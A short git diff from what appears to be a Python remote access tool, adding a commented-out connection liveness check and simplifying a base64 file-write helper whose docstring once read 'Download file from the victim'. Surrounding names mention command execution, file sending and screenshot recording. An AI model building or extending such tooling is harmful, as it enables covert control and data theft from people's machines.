@@ -31,6 +31,19 @@ def _receive(conn:socket.socket):
         except (ConnectionResetError, TypeError):
             return None
 
+# Check if connection is alive or not
+
+# def _is_alive(conn:socket.socket):
+
+#     try:
+#         response = _send(conn, b'PING')
+#     except (ConnectionRefusedError, OSError, socket.timeout):
+#         return False
+    
+#     if b'PONG' == response:
+#         return True
+    
+#     return False
 
 # Excuting commands function
 
@@ -68,12 +81,10 @@ def _send_file(conn:socket.socket, file):
 
     return
 
-def _write_file(name, data):
-    """Download file from the victim."""
+def _write_file(path, data):
+    """Download file from the conn."""
 
-    try:
-        with open(name, "wb") as file:
-            file.write(base64.b64decode(data))
-        
-    except FileExistsError:
-        print(f"[!] File named {name} exists.")
+    with open(path, "wb") as file:
+        file.write(base64.b64decode(data))
+
+# Screenshot and record
